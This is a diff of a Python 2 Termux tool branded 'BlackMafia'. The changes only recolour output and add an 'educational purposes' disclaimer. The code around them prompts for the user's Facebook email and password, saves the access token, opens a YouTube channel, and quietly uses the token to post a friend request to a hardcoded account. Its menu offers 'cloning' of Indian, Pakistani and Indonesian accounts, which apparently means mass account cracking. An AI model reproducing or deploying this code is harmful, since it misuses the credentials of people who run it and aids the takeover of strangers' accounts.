@@ -175,10 +175,10 @@ def login():
 		jalan(' \033[1;91mWarning● \033[1;92mUse a New Account To Login' )
 		jalan(' \033[1;91mWarning● \033[1;92mTermux All Version Work ' )                 
 		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-		print('\033[1;97m▬\x1b[1;91m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
+		print('\033[1;97m  ▬\x1b[1;91m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
-		id = raw_input('\033[1;97m[+] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;94m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;91mPassword\x1b[1;91m: \x1b[1;94m')
+		id = raw_input('\033[1;97m[+] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;91mPassword\x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -205,7 +205,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;94mLogin Successful.•◈•..'
+				print '\n\x1b[1;95mLogin Successful.•◈•..'
 				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -218,7 +218,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;94mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -252,7 +252,13 @@ def menu():
 	print "\033[1;97m«--•◈••◈•--\033[1;93mLogged in User Info\033[1;97m---•◈••◈•---»"
 	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
-	print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mDisclaimer\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
+        print "\033[1;95m This presentation is for educational purposes ONLY."
+        print "\033[1;95m How you use this information is your responsibility. "
+        print "\033[1;95m I will not be held accountable for any illegal activities. "
+        print "\033[1;95m This Tool/Channel Doesn't Support illegal activities."
+        print "\033[1;95m This Tool is For Educational Purpose."
+        print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m1 .\x1b[1;96m Start Cloning India"
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m2 .\x1b[1;96m Start Cloning Pak ID/Group"
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m3 .\x1b[1;96m Start Cloning Indonasia"
